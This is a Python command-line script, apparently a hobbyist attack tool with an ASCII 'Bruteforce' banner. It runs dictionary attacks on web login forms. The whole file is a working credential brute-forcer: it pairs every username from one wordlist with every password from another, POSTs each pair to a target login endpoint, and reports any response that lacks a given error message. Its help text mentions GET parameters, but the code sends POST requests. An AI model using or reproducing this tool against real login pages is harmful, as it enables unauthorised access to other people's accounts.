#!/usr/bin/env python3

import requests
import argparse

welcome = """
\n\n

\ \        / /    | |
 \ \  /\  / / ___ | |  ___   ___   _ __ ___    __
  \ \/  \/ / / _ \| | / __| / _ \ | '_ ` _ \  / _/
   \  /\  / |  __/| || (__ | (_) || | | | | ||  _/
    \/  \/   \___||_| \___| \___/ |_| |_| |_| \__|

 ____                _            _
|  _ \              | |          / _|
| |_) | _ __  _   _ | |_   ___  | |_   ___   _ __   ___   __
|  _ < | '__|| | | || __| / _ \ |  _| / _ \ | '__| / __| / _/
| |_) || |   | |_| || |_ |  __/ | |  | (_) || |   | (__ |  _/
|____/ |_|    \__,_| \__| \___| |_|   \___/ |_|    \___| \__|


  _____         _    _                           ___          ___    ___  
 / ____|       | |  (_)                         / _ \        / _ \  / _ \	
| |  __  _   _ | |_  _   ___  _ __  _ __   ___ | | | |__  __| (_) || | | |
| | |_ || | | || __|| | / _ \| '__|| '__| / _ \| | | |\ \/ / > _ < | | | |
| |__| || |_| || |_ | ||  __/| |   | |   |  __/| |_| | >  < | (_) || |_| |
 \_____| \__,_| \__||_| \___||_|   |_|    \___| \___/ /_/\_\ \___/  \___/ 
\n\n"""



banner = """

            	     The target is being destroyed 
        [+]█████████████████████████████████████████████████[+]
"""

print(welcome)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-url", "--url", help="Enter the URL with the endpoint that does password validation, ex: http://127.0.0.1/login/check")
    parser.add_argument("-u", "--user", help="User list")
    parser.add_argument("-p", "--passw", help="Password list")
    parser.add_argument("-pU", "--paramU", help="Enter the user field parameter of the GET request")
    parser.add_argument("-pP", "--paramP", help="Enter GET request password field parameter")
    parser.add_argument("-e", "--error", help="Enter the error message")
    args = parser.parse_args()

    if args.user:
        with open(args.user) as user_file:
            users = user_file.readlines()
    else:
        print("No wordlist of users provided")
        return

    if args.passw:
        with open(args.passw) as passw_file:
            passwords = passw_file.readlines()
    else:
        print("No wordlist of passwords provided")
        return

    if args.url:
        print(banner)
        for user in users:
            for password in passwords:
                payload = {args.paramU: user.strip(), args.paramP: password.strip()}
                requisicao = requests.post(args.url, data=payload)
                if args.error in requisicao.text:
                    continue
                else:
                    print('Good news! Something good happened at: "{}"'.format(payload))
    else:
        print("No URL provided")


if __name__ == "__main__":
    main()
